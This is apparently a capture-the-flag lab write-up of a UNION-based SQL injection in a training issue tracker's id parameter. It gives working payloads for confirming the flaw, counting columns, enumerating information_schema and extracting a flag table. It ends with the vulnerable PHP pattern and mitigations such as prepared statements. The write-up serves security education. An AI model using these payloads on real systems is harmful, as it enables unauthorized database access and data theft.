---
title: "SQL Injection via Issue Identifier Parameter | Trace Control"
date: 2026-06-02 00:00:00 +0530
categories: [A05 - Injection, SQL Injection]
tags: [webverselabs-pro, sql-injection, union-based-sqli, database-enumeration, mariadb, information-schema]
author: Shivansh Sharma
image:
  path: /assets/images/posts/trace-control-sqli.webp
  alt: SQL Injection via Issue Identifier Parameter | Trace Control
---

## Lab Link

Lab: [Trace Control](https://dashboard.webverselabs-pro.com/challenges/trace-control)

---

## Overview

Trace Control is an internal issue tracking platform used by a small platform engineering team. The application exposes issue records through a numeric identifier passed in the URL.

During testing, the issue identifier parameter was found to be directly incorporated into a backend SQL query without proper parameterization. By manipulating the `id` parameter, it was possible to inject arbitrary SQL statements into the database query.

Using UNION-based SQL Injection, the underlying MariaDB database could be enumerated, internal tables discovered, and sensitive information extracted.

---

## Objective

Exploit the vulnerable issue identifier parameter to enumerate the database and retrieve the flag stored within an internal administrative table.

---

## Vulnerability Identification

### Classification Hierarchy

```text
A05 - Injection
└── SQL Injection
    └── UNION-Based SQL Injection
        └── Database Enumeration and Data Extraction
```

---

## Reconnaissance

The application displays issue records through the following endpoint:

```text
https://55b5d360-4065-trace-control-02771.challenges.webverselabs-pro.com/issues.php?id=1
```

The `id` parameter appears to control which issue is retrieved.

Because the parameter is numeric and directly influences backend database queries, it becomes a potential SQL Injection target.

---

## Confirming SQL Injection

Initial testing used a classic SQL Injection payload:

```sql
' or 1=1-- -
```

URL encoded:

```text
1%27+or+1%3d1--+-
```

Request:

```text
/issues.php?id=1%27+or+1%3d1--+-
```

Response:

```text
SQL error: SQLSTATE[42000]: Syntax error or access violation: 1064
```

The resulting database error confirms that user input reaches the SQL interpreter.

Because the application appears to inject the parameter into a numeric context, a quote-less payload is more appropriate.

Payload:

```sql
or 1=1-- -
```

This confirms the presence of SQL Injection.

---

## Determining Column Count

To perform a UNION-based attack, the number of columns in the original query must be identified.

Testing with:

```sql
order by 8-- -
```

indicates that the query contains eight columns.

---

## Building a UNION Query

A standard UNION test is performed:

```sql
1 UNION SELECT 1,2,3,4,5,6,7,8--
```

However, the application's original query still returns legitimate data, making the injected row difficult to observe.

A common technique is to force the original query to return no rows.

Using:

```sql
-1 UNION SELECT 1,2,3,4,5,6,7,8--
```

ensures that only the UNION result is rendered.

Request:

```http
GET /issues.php?id=-1+UNION+SELECT+1,2,3,4,5,6,7,8--
```

The injected values become visible in the response, confirming successful UNION-based SQL Injection.

---

## Identifying the Database

Replace one visible column with the database function:

```sql
database()
```

Request:

```http
GET /issues.php?id=-1+UNION+SELECT+1,2,3,database(),5,6,7,8--
```

Response:

```text
chalapp
```

Current database:

```text
chalapp
```

---

## Enumerating Tables

The next step is enumerating tables from the current database using `information_schema`.

Payload:

```sql
-1 UNION SELECT
1,
2,
group_concat(table_name),
4,
5,
6,
7,
8
FROM information_schema.tables
WHERE table_schema=database()--
```

Request:

```text
/issues.php?id=-1 union select 1,2,group_concat(table_name),4,5,6,7,8 from information_schema.tables where table_schema=database()-- -
```

Response:

```text
projects
comments
admin_flags
issues
```

Interesting table:

```text
admin_flags
```

---

## Enumerating Columns

Attempting a direct query initially fails.

A scalar subquery is used instead:

```sql
-1 UNION SELECT
1,
2,
(
 SELECT group_concat(column_name)
 FROM information_schema.columns
 WHERE table_name='admin_flags'
),
4,
5,
6,
7,
8--
```

Request:

```text
/issues.php?id=-1 UNION SELECT 1,2,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='admin_flags'),4,5,6,7,8--
```

Response:

```text
id,flag
```

The table contains:

```text
id
flag
```

---

## Extracting the Flag

The final payload retrieves data from the flag column.

```sql
-1 UNION SELECT
1,
2,
(
 SELECT group_concat(flag)
 FROM admin_flags
),
4,
5,
6,
7,
8--
```

Request:

```text
/issues.php?id=-1 UNION SELECT 1,2,(SELECT group_concat(flag) FROM admin_flags),4,5,6,7,8--
```

Response:

```text
WEBVERSE{.....}
```

---

## Flag

```text
WEBVERSE{.....}
```

---

## Proof of Exploitation

Database identification:

```sql
database()
```

Result:

```text
chalapp
```

Table enumeration:

```sql
information_schema.tables
```

Result:

```text
projects
comments
admin_flags
issues
```

Column enumeration:

```sql
information_schema.columns
```

Result:

```text
id,flag
```

Sensitive data extraction:

```sql
SELECT group_concat(flag) FROM admin_flags
```

Result:

```text
WEBVERSE{.....}
```

---

## Root Cause Analysis

The application concatenates user-controlled input directly into a SQL query.

A vulnerable implementation would resemble:

```php
$query = "SELECT * FROM issues WHERE id = " . $_GET['id'];
```

Because the parameter is inserted directly into the SQL statement, attackers can alter query logic and execute arbitrary SQL operations.

The absence of parameterized queries allows:

* Authentication bypass
* Data extraction
* Database enumeration
* Administrative data disclosure

---

## Impact

An attacker can:

* Read arbitrary database records
* Enumerate schemas and tables
* Access sensitive internal information
* Bypass application logic
* Extract credentials and secrets

In real-world environments, SQL Injection frequently leads to complete database compromise.

---

## Mitigation

### Use Parameterized Queries

Instead of:

```php
$query = "SELECT * FROM issues WHERE id = $id";
```

Use:

```php
$stmt = $pdo->prepare("SELECT * FROM issues WHERE id = ?");
$stmt->execute([$id]);
```

### Enforce Strict Input Validation

The `id` parameter should only accept integers.

### Restrict Database Permissions

Application accounts should not have unnecessary access to metadata tables.

### Disable Detailed SQL Errors

Production systems should never expose database error messages to users.

### Implement Defense in Depth

Combine:

* Prepared statements
* Input validation
* Least privilege
* Error handling

for effective SQL Injection prevention.

---

## Real-World Insight

UNION-based SQL Injection remains one of the most effective techniques for database compromise because it allows attackers to merge arbitrary query results into legitimate application responses.

Common attacker objectives include:

```text
Database enumeration
Table discovery
Credential theft
Administrative data extraction
Application secret disclosure
```

The Trace Control challenge demonstrates a fundamental security principle:

**Any user input that reaches a SQL query without parameterization becomes part of the query itself.**
